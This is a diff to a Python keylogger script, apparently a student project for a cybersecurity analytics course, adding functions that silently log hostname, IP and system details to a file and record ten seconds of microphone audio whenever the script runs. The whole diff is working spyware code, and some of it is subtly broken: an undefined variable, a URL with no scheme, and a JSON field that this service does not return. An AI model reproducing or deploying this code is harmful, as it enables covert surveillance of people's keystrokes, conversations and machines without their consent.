@@ -29,14 +29,62 @@ from PIL import ImageGrab
 
 # default variables
 keys_info = "key_log.txt"
+sys_information= "system.txt"
+audio_information = "audio.wav"
 file_path = "C:\\Users\\natal\\OneDrive - csulb\\Academics\\Grad School\\2. CSULB\\Courses\\4. Fall 2023\\IS 665 - Cybersec Analytics\\Group Project - Keyloger"
 extend = "\\"
+microphone_time =10
+file_path_txt = file_path+extend+ keys_information
+file_path_sys = file_path+extend+sys_information
+file_path_audio = file_path+extend+audio_information
 
 
 # create a basic 
 # initialize variables
 count = 0 
 keys = []
+
+
+def get_public_ip():
+	try:
+		# Use httpbin to get public IP address
+		response = requests.get("ipinfo.io")
+		data = response.json()
+		
+		# Extract public IP address
+		public_ip = data.get("origin", "Unknown")
+		
+		return public_ip
+	except Exception as e:
+		return "error"
+
+def computer_information():
+	with open(file_path_sys, 'a') as f:
+		hostname = socket.gethostname()
+		f.write("Hostname: "+hostname+"\n")
+		public_IP = get_public_ip()
+		#f.write("PublicIP Address: " +public_IP+"\n")
+		IPAddr = socket.gethostbyname(hostname)
+		f.write("PrivateIP Address" + IPAddr+"\n")
+		f.write("processor: " + platform.processor()+"\n")
+		f.write("System: " +platform.system()+"\n")
+		f.write("Version: " +platform.version()+"\n")
+		f.write("Machine: "+platform.machine()+"\n")
+		
+computer_information()
+
+def microphone():
+	#frequency
+	fs = 44100
+	#time
+	seconds=microphone_time
+
+	myrecording = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
+	sd.wait()
+
+	write(file_path_audio, fs, myrecording)
+
+microphone()
 
 def on_press(key):
     """Called when a key is pressed"""
